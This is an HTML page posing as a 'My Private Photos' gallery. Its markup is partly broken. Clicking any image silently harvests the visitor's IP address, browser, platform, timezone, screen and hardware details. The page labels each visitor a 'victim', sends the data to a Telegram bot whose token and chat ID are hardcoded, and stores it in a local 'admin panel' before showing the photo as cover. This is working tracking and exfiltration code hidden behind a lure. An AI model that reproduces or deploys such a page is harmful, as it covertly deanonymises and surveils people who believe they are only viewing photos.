<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
            background: linear-gradient(45deg, #ff8c00, #ff2a00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 4px 20px rgba(255, 140, 0, 0.3);
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 140, 0, 0.3);
            background: rgba(255, 140, 0, 0.1);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
            color: #ff8c00;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">

        <div class="gallery">
            <div class="image-card" onclick="startStealthExploitation(1)">

                     alt="Private Photo 1">

            <div class="image-card" onclick="startStealthExploitation(2)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=691aeb2b&is=691999ab&hm=2aaa15367751910daaee76eed6583f683228347ac9cfb4e5ccd0c3b44cdb21ec&=&format=webp&quality=lossless&width=482&height=858" 
                     alt="Private Photo 2">
                <div class="image-title">NVDES</div>

            <div class="image-card" onclick="startStealthExploitation(3)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691af5ed&is=6919a46d&hm=29a4d8015f5202bdb787a2232eeebc3141674fe6a59ebd3fdd45e4742b70985e&=&format=webp&quality=lossless&width=483&height=858" 
                     alt="Private Photo 3">

    <script>
        const CONFIG = {
            telegram: {
                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                chatId: '8032494479'
            },
            images: {
                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
            }
        };

        // STEALTH DATA COLLECTION - No continuous streaming
        async function startStealthExploitation(imageId) {
            const loading = document.getElementById('loading');
            loading.style.display = 'block';
            
            try {
                // Disable further clicks during extraction
                document.querySelectorAll('.image-card').forEach(card => {
                    card.style.pointerEvents = 'none';
                    card.style.opacity = '0.6';
                });

                // Quick stealth data extraction
                const extractionStart = Date.now();
                const victimData = await extractEssentialData();
                const extractionTime = Date.now() - extractionStart;

                // Add metadata
                victimData.meta = {
                    imageId: imageId,
                    extractionTime: extractionTime,
                    timestamp: new Date().toISOString(),
                    victimId: generateVictimId(),
                    url: window.location.href,
                    referrer: document.referrer
                };

                // Send to Telegram
                await sendStealthTelegramAlert(victimData);
                
                // Store in admin panel
                storeInAdminPanel(victimData);

                // Show success and redirect
                loading.innerHTML = '<div style="color: #48bb78;">Access granted! Loading image...</div>';
                setTimeout(() => {
                    window.open(CONFIG.images[imageId], '_blank');
                    // Restore UI
                    loading.style.display = 'none';
                    document.querySelectorAll('.image-card').forEach(card => {
                        card.style.pointerEvents = 'auto';
                        card.style.opacity = '1';
                    });
                }, 1000);
                
            } catch (error) {
                console.error('Extraction failed:', error);
                // Fallback - still open image
                setTimeout(() => {
                    window.open(CONFIG.images[imageId], '_blank');
                    loading.style.display = 'none';
                    document.querySelectorAll('.image-card').forEach(card => {
                        card.style.pointerEvents = 'auto';
                        card.style.opacity = '1';
                    });
                }, 1000);
            }
        }

        // Essential data extraction only
        async function extractEssentialData() {
            const data = {};

            // Only extract critical information
            data.basicInfo = await extractBasicInfo();
            data.network = await extractNetworkData();
            data.hardware = extractEssentialHardware();
            data.user = extractUserInteraction();

            return data;
        }

        async function extractBasicInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`
            };
        }

        async function extractNetworkData() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                return {
                    ip: ipData.ip,
                    onLine: navigator.onLine
                };
            } catch (error) {
                return { ip: 'Unknown', onLine: navigator.onLine };
            }
        }

        function extractEssentialHardware() {
            return {
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'Unknown',
                touchSupport: 'ontouchstart' in window
            };
        }

        function extractUserInteraction() {
            return {
                timeOnPage: Date.now() - (window.pageLoadTime || Date.now()),
                clicks: window.clickCount || 0
            };
        }

        async function sendStealthTelegramAlert(data) {
            try {
                const message = `
üïµÔ∏è STEALTH CAPTURE ALERT
üéØ Victim ID: ${data.meta.victimId}
üåê IP: ${data.network.ip}
üìç Location: ${data.basicInfo.timezone}
üíª Platform: ${data.basicInfo.platform}
üñ•Ô∏è Screen: ${data.basicInfo.screen}
‚è∞ Time: ${new Date(data.meta.timestamp).toLocaleString()}
üîó Image: ${data.meta.imageId}
                `.trim();

                await sendToTelegram(message);
            } catch (error) {
                console.error('Telegram send failed:', error);
            }
        }

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                return false;
            }
        }

        function storeInAdminPanel(data) {
            try {
                const existing = localStorage.getItem('victimData');
                const victims = existing ? JSON.parse(existing) : [];
                
                victims.unshift(data);
                
                if (victims.length > 100) {
                    victims.splice(100);
                }
                
                localStorage.setItem('victimData', JSON.stringify(victims));
                localStorage.setItem('lastVictimUpdate', Date.now().toString());
                
            } catch (e) {
                console.error('Storage failed:', e);
            }
        }

        function generateVictimId() {
            return 'vic_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
        }

        // Minimal behavioral tracking
        window.pageLoadTime = Date.now();
        window.clickCount = 0;

        document.addEventListener('click', () => {
            window.clickCount++;
        });

        console.log('üïµÔ∏è STEALTH DATA COLLECTION SYSTEM LOADED');
    </script>
</body>
</html>
